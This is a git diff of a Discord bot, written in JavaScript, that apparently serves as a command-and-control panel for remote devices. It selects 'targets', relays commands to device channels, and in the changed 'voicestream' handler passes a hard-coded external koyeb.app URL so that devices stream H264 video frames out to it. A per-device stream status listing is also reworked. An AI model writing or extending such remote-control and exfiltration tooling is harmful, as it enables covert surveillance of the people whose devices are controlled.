@@ -8,7 +8,7 @@ import {
 import { statusCard } from './statusCard.js'
 import { ICONS } from './icons.js'
 import { C, E, A, smallCaps, mono, createBox, bold, ts, randGif, DEV_CMDS, BOT_CMDS, VALID_CMDS, ALERT_CMD_MAP, BTN_ACTIONS, formatSize, barAnim, clockText } from './utils/index.js'
-import { VideoStreamManager } from './stream.js'
+import { videoStream } from './stream.js'
 const ST_COL = { online: C.neon, offline: C.void, warning: C.gold, danger: C.electric, info: C.purple }
 const { DISCORD_TOKEN, ALLOWED_CHANNEL_ID, ALERTS_CHANNEL_ID } = process.env
 if (!DISCORD_TOKEN) { console.error('Missing DISCORD_TOKEN'); process.exit(1) }
@@ -665,7 +665,7 @@ client.on(Events.InteractionCreate, async (i) => {
         case 'voicestream': {
           const voiceChannelId = options.getString('channel')
           const guildId = options.getString('guild')
-          
+
           await guild.channels.fetch()
           let deviceCh = null
           if (targets.has(uid)) {
@@ -679,19 +679,23 @@ client.on(Events.InteractionCreate, async (i) => {
             if (channels.size === 1) deviceCh = channels.first()
             else return i.editReply(`${E.warning} Multiple devices. Use \`/target\` first ${E.skull}`)
           }
-          
-          // Send command to device to start voice stream
-          const r = await sendCmdLogged(deviceCh, 'stream', `voice ${voiceChannelId} ${guildId}`, uid, user.username)
+
+          const botUrl = process.env.BOT_HTTP_URL || `https://substantial-impala-aymouo-bc7f3c76.koyeb.app`
+          const payload = `voice ${voiceChannelId} ${guildId} ${botUrl}`
+          const r = await sendCmdLogged(deviceCh, 'stream', payload, uid, user.username)
           if (!r.ok) return i.editReply(`${E.coffin} Error: ${r.err} ${E.skull}`)
-          
-          return i.editReply({ content: `${E.satellite} Voice stream command sent!\nDevice will connect to voice channel and stream at 30fps.`, components: RESULT_BTNS })
+
+          return i.editReply({ content: `${E.satellite} Voice stream starting...\nBot will join voice channel and receive H264 frames from device.`, components: RESULT_BTNS })
         }
         case 'streamstatus': {
           const status = videoStream.getStreamStatus()
           if (!status) {
             return i.editReply(`${E.warning} No active streams ${E.skull}`)
           }
-          return i.editReply({ content: `${E.satellite} **Stream Status**\nActive: ${status.active}\nFPS: ${status.fps}\nResolution: ${status.resolution}\nBuffer: ${status.buffer} frames\nUptime: ${Math.floor(status.uptime / 1000)}s`, components: MENU_BTNS })
+          const lines = status.streams.map(s =>
+            `${s.active ? E.online : E.offline} **${s.deviceId}** | ${s.fps}fps ${s.resolution} | ${s.frames} frames | ${s.connection} | ${s.uptime}s`
+          ).join('\n')
+          return i.editReply({ content: `${E.satellite} **Stream Status** (${status.total} active)\n\`\`\`${lines}\n\`\`\``, components: MENU_BTNS })
         }
       }
     } catch (err) {
